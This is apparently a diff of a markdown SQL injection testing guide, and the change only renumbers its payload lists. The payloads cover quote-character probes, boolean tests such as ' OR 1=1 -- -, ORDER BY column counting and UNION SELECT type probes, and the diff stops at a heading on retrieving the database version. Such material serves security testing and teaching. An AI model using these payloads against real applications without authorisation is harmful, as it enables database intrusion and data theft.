@@ -13,18 +13,24 @@ To find SQLi, look for input fields, URL parameters, headers, or cookies that in
 Inject special characters into parameters to break the database query syntax:
 
 
-  '
-  "
-  `
-  ')
-  ")
-  ;
+  1. '
+     
+  2. "
+     
+  3. `
+     
+  4. ')
+     
+  5. ")
+     
+  6. ;
 
 ### 2. Boolean Tests
 Inject logical operators to verify if the application responds differently:
 
- ' OR 1=1 -- -
- ' OR 1=2 -- -
+1. ' OR 1=1 -- -
+ 
+2.  ' OR 1=2 -- -
 
 ### 3. Mathematical Evaluation
 Inject expressions to test if parameters are evaluated numerically:
@@ -43,14 +49,17 @@ Used when query results are returned directly in the application's response.
 
 # 1.Determine Column Count: Increment until an error or change in response occurs:
 
-  ' ORDER BY 1 -- -
-  ' ORDER BY 2 -- -
-  ' ORDER BY 3 -- -
+  1. ' ORDER BY 1 -- -
+     
+  2. ' ORDER BY 2 -- -
+  
+  3. ' ORDER BY 3 -- -
 
 # 2.Determine Column Data Types: Look for which columns can hold string data:
 
-  ' UNION SELECT 'a', NULL -- -
-  ' UNION SELECT NULL, 'a' -- -
+  1. ' UNION SELECT 'a', NULL -- -
+  
+  2. ' UNION SELECT NULL, 'a' -- -
 
 # 3.Retrieve Data (Targeting Database Version):
 
